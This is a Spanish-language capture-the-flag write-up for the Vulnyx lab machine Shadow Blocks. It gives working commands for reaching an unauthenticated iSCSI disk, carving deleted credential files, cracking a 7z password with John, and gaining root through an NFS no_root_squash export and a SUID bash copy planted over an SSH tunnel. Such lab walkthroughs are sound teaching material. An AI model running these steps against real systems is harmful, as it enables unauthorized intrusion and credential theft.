---
author: Lenam
pubDatetime: 2026-03-04T00:00:00Z
title: WriteUp Shadow Blocks - Vulnyx
urlSlug: shadowblocks-writeup-vulnyx
featured: true
draft: false
ogImage: "../../../assets/images/shadowblocks/OpenGraph.png"
tags:
  - writeup
  - vulnyx
  - iSCSI
  - NFS
  - forensics
  - password cracking
  - suid
description:
  "Writeup de la máquina Shadow Blocks (Vulnyx): Explotación de iSCSI y recuperación de datos en disco para filtrar credenciales, y uso de NFS sin protección para escalar privilegios."
lang: es
translationId: shadow-blocks-writeup-vulnyx
---

![Shadow Blocks VirtualBox](../../../assets/images/shadowblocks/OpenGraph.png)

Writeup de la máquina **Shadow Blocks** ([Vulnyx](https://vulnyx.com/)): Explotación de iSCSI y recuperación de datos en disco para filtrar credenciales, y uso de NFS sin protección para escalar privilegios.

## Tabla de contenido

## Enumeración

![Shadow Blocks VirtualBox](../../../assets/images/shadowblocks/20260228_030429_image.png)

El primer paso en cualquier CTF es reconocer la superficie de ataque. Para ello realizamos un escaneo de puertos contra la IP objetivo.

```bash
$ nmap -p- -Pn 192.168.1.133                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-28 18:59 CET
Nmap scan report for 192.168.1.133
Host is up (0.00068s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
3260/tcp open  iscsi
MAC Address: 08:00:27:54:16:99 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 108.76 seconds
```

**Explicación del comando:**
- `-p-`: Escanea **todos los puertos TCP** (1-65535), no solo los habituales. Imprescindible en CTF para no perder vectores ocultos.
- `-Pn`: **Omite el descubrimiento de hosts por ping**. Muchas máquinas bloquean ICMP; con `-Pn` nmap asume que el host está activo y va directo al escaneo de puertos. Sin esto, podríamos obtener "Host seems down".
- `192.168.1.133`: IP objetivo de la máquina en la red virtual.

**Resultado:** Dos puertos abiertos — **22 (SSH)** para acceso remoto y **3260 (iSCSI)**, protocolo de almacenamiento en red. El puerto 3260 es el estándar para iSCSI (Internet Small Computer System Interface).

A continuación refinamos el escaneo sobre esos puertos para obtener versiones y scripts:

```bash
$ nmap -p22,3260 -sVC -Pn -n 192.168.1.133
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-28 19:04 CET
Nmap scan report for 192.168.1.133
Host is up (0.00038s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
3260/tcp open  iscsi   Synology DSM iSCSI
| iscsi-info: 
|   iqn.2026-02.nyx.shadowblocks:storage.disk1: 
|     Address: 192.168.1.133:3260,1
|_    Authentication: NOT required
MAC Address: 08:00:27:54:16:99 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.27 seconds

```

**Explicación del comando:**
- `-p22,3260`: Escanea solo los puertos detectados como abiertos.
- `-sV`: **Detección de versiones** — identifica el software y versión (OpenSSH 10.0p2, Synology DSM iSCSI).
- `-sC`: Ejecuta **scripts por defecto** de nmap; entre ellos `iscsi-info`, que consulta los targets iSCSI y revela configuración sensible.
- `-n`: Desactiva la resolución DNS inversa para acelerar.
- `-Pn`: No realiza ping previo.

**Hallazgo clave:** El script `iscsi-info` descubre que el target iSCSI **no requiere autenticación** (`Authentication: NOT required`) y expone el IQN: `iqn.2026-02.nyx.shadowblocks:storage.disk1`. Cualquiera en la red puede conectarse al disco.

### Servicio iSCSI

iSCSI expone discos duros vía TCP/IP. Los clientes conectan a un "target" identificado por un IQN y pueden montar el disco como un dispositivo de bloque. Con autenticación deshabilitada, cualquiera puede acceder.

Confirmamos y gestionamos la conexión con `iscsiadm`:

```bash
$ sudo iscsiadm -m discovery -t sendtargets -p 192.168.1.133
192.168.1.133:3260,1 iqn.2026-02.nyx.shadowblocks:storage.disk1
```

**Explicación:** `-m discovery` explora targets disponibles; `-t sendtargets` usa el método estándar iSCSI SendTargets; `-p` indica el portal (IP:puerto). El resultado confirma el IQN y la dirección.

Iniciamos sesión para asociar el disco como dispositivo local:

```bash
sudo iscsiadm -m node --targetname="iqn.2026-02.nyx.shadowblocks:storage.disk1" -p 192.168.1.133:3260 --login
```

**Explicación:** `-m node` gestiona la sesión con el target; `--targetname` identifica el disco; `--login` establece la conexión. El kernel asigna un dispositivo de bloque (normalmente el siguiente disponible tras `/dev/sda`).

Tras el login, el disco aparece como dispositivo local. Con `fdisk -l` o `lsblk` comprobamos:

```bash
$ sudo fdisk -l
Disk /dev/sda: 80,09 GiB, 86000000000 bytes, 167968750 sectors
Disk model: VBOX HARDDISK   
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x6c9b1d52

Device     Boot Start       End   Sectors  Size Id Type
/dev/sda1  *     2048 167968749 167966702 80,1G 83 Linux


Disk /dev/sdb: 150 MiB, 157286400 bytes, 307200 sectors
Disk model: shadowblocks  
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 8388608 bytes
Disklabel type: dos
Disk identifier: 0x2566cb3e

Device     Boot Start    End Sectors  Size Id Type
/dev/sdb1        2048 307199  305152  149M 83 Linux

```

Aparece `/dev/sdb` (modelo "shadowblocks", 150 MiB) con la partición `/dev/sdb1` ( tipo 83 = Linux). Montamos y exploramos:

```bash
sudo mkdir /mnt/iscsi
sudo mount /dev/sdb1 /mnt/iscsi
find /mnt/iscsi -ls
```

**Explicación:**
- `mkdir /mnt/iscsi`: Punto de montaje donde se expondrá el sistema de archivos.
- `mount /dev/sdb1 /mnt/iscsi`: Asocia la partición al directorio; a partir de ahí accedemos a los archivos visibles en el filesystem.
- `find ... -ls`: Lista recursiva de archivos con permisos, propietario y tamaño.

**Importante:** Solo vemos archivos que siguen en el sistema de archivos. Los que fueron borrados ya no están en la tabla de inodos, pero sus datos pueden seguir en sectores no reasignados. Por eso la enumeración "normal" no revela credenciales; hay que recurrir a técnicas forenses.

## Filtración de credenciales

Los archivos borrados no desaparecen al instante: el sistema marca los bloques como libres, pero los datos siguen en disco hasta que se sobrescriben. Podemos recuperarlos mediante **file carving** sobre el espacio no asignado o una imagen forense.

**Proceso:**

1. **Desmontar** — Para trabajar sobre sectores "crudos" sin interferencia del cache del kernel.
2. **Crear imagen forense** — Trabajar sobre una copia evita alterar el disco original y cumple buenas prácticas forenses.
3. **Recuperar con Photorec** — Escanea sectores buscando cabeceras y pies de archivo conocidos (signatures) para extraer archivos aunque no tengan entrada en el filesystem.

```bash
# Desmontar para acceder a sectores raw
sudo umount /mnt/iscsi
# Imagen forense: no modificamos el original
sudo dd if=/dev/sdb1 of=iscsi.img bs=4M status=progress
# Recuperar archivos del espacio liberado (file carving)
sudo photorec iscsi.img
```

En photorec seleccionamos el disco
![](../../../assets/images/shadowblocks/20260228_194217_image.png)

todo el espacio del disco
![](../../../assets/images/shadowblocks/20260228_194243_image.png)

el formato del disco
![](../../../assets/images/shadowblocks/20260228_194301_image.png)

y después con la tecla "C" elegimos dónde guardar todos los ficheros recuperados.
![](../../../assets/images/shadowblocks/20260228_194327_image.png)

Los archivos se guardan en carpetas `recup_dir.X/`. Suele haber ficheros de texto y archivos 7z. Si intentamos descomprimir un 7z nos pedirá contraseña, así que hay que crackearla.

### Cracking de archivos 7z

`7z2john` extrae el hash de la contraseña del archivo 7z para que John the Ripper pueda probar contraseñas por fuerza bruta o diccionario. Hay que usar el nombre del fichero 7z correcto (puede variar según la recuperación).

```bash
7z2john recup_dir.1/f0018434.7z > hash
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```

**Explicación:**
- `7z2john fichero.7z > hash`: Convierte los metadatos cifrados del 7z a un formato que John entiende. El hash incluye el salt y los parámetros AES; John probará contraseñas hasta dar con la correcta.
- `john --wordlist=rockyou.txt ./hash`: Prueba cada línea de rockyou.txt como contraseña. rockyou.txt es un diccionario habitual de contraseñas débiles/reutilizadas.

Obtenemos la contraseña `donald`.

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 6 for all loaded hashes
Cost 3 (compression type) is 0 for all loaded hashes
Cost 4 (data length) is 122 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
donald           (?)     
1g 0:00:00:04 DONE (2026-02-28 19:51) 0.2105g/s 215.5p/s 215.5c/s 215.5C/s marie1..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Descomprimimos el 7z con la contraseña `donald`. El nombre del archivo puede ser distinto al usado para el hash (p. ej. `f0018448.7z` si contiene `credentials.txt`).

```bash
7z e recup_dir.1/f0018448.7z
```

**Explicación:** `7z e` extrae el contenido del archivo (modo "extract"). Pedirá la contraseña; al introducir `donald` descomprimirá los archivos al directorio actual.

Dentro aparece `credentials.txt`, el fichero que había sido borrado en el disco y recuperado por Photorec.

> **Nota:** La contraseña se ha ocultado para no facilitar la resolución de la máquina a quienes quieran practicarla.

```bash
$ cat credentials.txt 
ShadowBlocks Internal Access Credentials
=======================================

System: Primary Storage Node
Environment: Production
Access Level: Administrative

Username: lenam
Password: ********

Note:
This file is intended for temporary migration procedures only.
It must be deleted after use.
Last reviewed: 2026-02-15
```

Usamos estas credenciales para acceder por SSH al servidor (usuario `lenam`, contraseña del archivo):

```bash
ssh lenam@192.168.1.133
```

**Motivo:** Las credenciales encontradas eran para "migración" y se suponía borradas, pero seguían en sectores no sobrescritos del disco iSCSI. Al conectarnos obtenemos shell de usuario `lenam` para continuar la escalada.

## Escalada de privilegios

Con privilegios de `lenam` revisamos puertos locales (`netstat`, `ss`) o ejecutamos herramientas como LinPEAS. Esto revela el servicio **NFS** (puertos 2049, 111 y otros dinámicos) con una configuración peligrosa: `no_root_squash`.

**Nota:** Los puertos NFS (2049, 111, etc.) no estaban visibles desde fuera en el escaneo inicial con nmap; solo eran accesibles localmente en la máquina víctima. Por eso necesitamos el túnel SSH para poder montar el export desde nuestra Kali.

**Qué es `no_root_squash`:** Por defecto NFS "aplasta" al usuario root del cliente y lo mapea a `nobody` por seguridad. Con `no_root_squash` el root del cliente conserva UID 0 en el servidor. Si podemos escribir en el export como root (desde una máquina que controlamos) y luego ejecutar lo escrito desde la víctima, podemos escalar a root.

Referencia: [NFS no_root_squash (HackTricks)](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe)

Comprobamos las exportaciones NFS en el servidor:

```bash
lenam@shadowblocks:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/srv/nfs *(rw,sync,fsid=0,no_subtree_check,no_root_squash,insecure)
```

**Análisis de `/etc/exports`:**
- `/srv/nfs`: Directorio exportado.
- `*`: Cualquier cliente puede montar.
- `rw`: Lectura y escritura.
- `no_root_squash`: **Vulnerable** — el root del cliente conserva UID 0.
- `insecure`: Permite conexiones desde puertos >1024 (necesario para el túnel).

### Explotación

NFS suele escuchar solo en localhost o en una interfaz interna. Si no tenemos acceso directo, hacemos un **túnel SSH** para redirigir el puerto NFS a nuestra máquina:

```bash
ssh -L 2049:127.0.0.1:2049 lenam@192.168.1.133
```

**Explicación del túnel:** `-L 2049:127.0.0.1:2049` redirige el puerto local 2049 de nuestra Kali al puerto 2049 del localhost de la máquina objetivo. Así, al conectar a `127.0.0.1:2049` desde Kali, el tráfico llega al NFS del servidor vía SSH.

En **otra terminal**, con el túnel SSH abierto y ejecutando los comandos como **root** en Kali (necesario para que NFS interprete nuestras acciones como UID 0), montamos el export y copiamos un bash con bit SUID:

```bash
mkdir -p /mnt/nfs
mount -t nfs -o vers=4 127.0.0.1:/ /mnt/nfs
cp /bin/bash /mnt/nfs/bashroot
chmod u+s /mnt/nfs/bashroot
```

**Por qué funciona:**
1. `mount ... 127.0.0.1:/`: Montamos como root en nuestra Kali; gracias al túnel el NFS del servidor recibe la petición.
2. `no_root_squash` hace que nuestras operaciones como root en el share se reflejen como UID 0 en el servidor.
3. `cp /bin/bash` y `chmod u+s`: Copiamos el binario y le ponemos bit SUID. En el servidor el archivo queda como propietario **root** con SUID.
4. Al ejecutar `/srv/nfs/bashroot -p` desde `lenam`, el kernel ve el bit SUID y lanza el proceso como dueño del archivo (root). El `-p` evita que bash descarte privilegios al ser invocado con SUID.

En la sesión SSH como `lenam`:

```bash
/srv/nfs/bashroot -p
```

Se obtiene shell con UID 0 (root).

Podemos leer las flags con:

```bash
cat /home/lenam/user.txt   # Tras obtener acceso como lenam
cat /root/root.txt         # Tras escalar a root
```

## Conclusiones

Shadow Blocks combina varias técnicas: acceso a almacenamiento iSCSI sin autenticación, recuperación forense de archivos borrados, cracking de contraseñas y explotación de NFS mal configurado. Las credenciales "temporales" nunca se eliminaron de forma segura (borrado sin sobrescritura), y NFS con `no_root_squash` permitió escalar de usuario a root usando un binario SUID colocado vía túnel SSH.

**Puntos clave:**
- iSCSI sin autenticación expone discos a toda la red.
- Los archivos borrados pueden recuperarse si los sectores no han sido sobrescritos.
- Las contraseñas débiles (diccionario) siguen siendo un vector común.
- NFS con `no_root_squash` permite escalar privilegios si un atacante con acceso (en este caso, lenam vía túnel SSH) puede montar el export como root y colocar un binario SUID.

## Referencias

- [3260 - Pentesting iSCSI - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/3260-pentesting-iscsi)
- [2049 - Pentesting NFS Service - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)
- [iSCSI - Linux man page (open-iscsi)](https://linux.die.net/man/8/iscsiadm)
- [NFS - exports(5) - Linux man page](https://man7.org/linux/man-pages/man5/exports.5.html)
- [dd(1) - Linux man page](https://man7.org/linux/man-pages/man1/dd.1.html)
- [mount.nfs(8) - Linux man page](https://man7.org/linux/man-pages/man8/mount.nfs.8.html)
- [TestDisk / PhotoRec - Documentación oficial](https://www.cgsecurity.org/wiki/PhotoRec)

